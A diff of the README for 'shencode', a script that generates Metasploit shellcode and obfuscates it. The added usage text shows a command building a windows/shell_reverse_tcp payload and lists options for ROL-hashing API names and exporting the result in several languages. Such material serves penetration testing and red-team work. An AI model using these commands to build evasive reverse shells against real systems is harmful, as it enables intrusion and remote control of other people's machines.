@@ -1,5 +1,5 @@
 # shencode
-automation script for creating and obfuscating metasploit shellcode
+automation scr ipt for creating and obfuscating metasploit shellcode
 
 ![shencode-1.png](shencode-1.png)
 
@@ -22,9 +22,19 @@ automation script for creating and obfuscating metasploit shellcode
 
 ## How to use
 
-Please change the metasploit path in line 166 that it fits your needs. This will be fixed in the future.
+`python shencode.py --payload windows/shell_reverse_tcp --arg1 "LHOST=127.0.0.1" --arg2 "LPORT=4443" --key 33 --outputformat "c" [--showmod] [--decompile]`
 
-`python shencode.py --payload windows/shell_reverse_tcp --arg1 "LHOST=127.0.0.1" --arg2 "LPORT=4455" --key 128 --verbose`
+Please change the metasploit path in line 8. This will be fixed in the future.
+
+`msfvenom_path = "c:\\metasploit-framework\\bin\\msfvenom.bat"`
+
+### Parameter
+
+- `--payload` - create a payload with msfvenom, use `--arg1` and `--arg2` for command line arguments
+- `--key` - ROL Key hash API functions
+- `--outputformat` - c, cs, casm, ps1, py, hex
+- `--showmod` - lists changed bytes
+- `--decompile` - decompile
 
 ## Credits
 
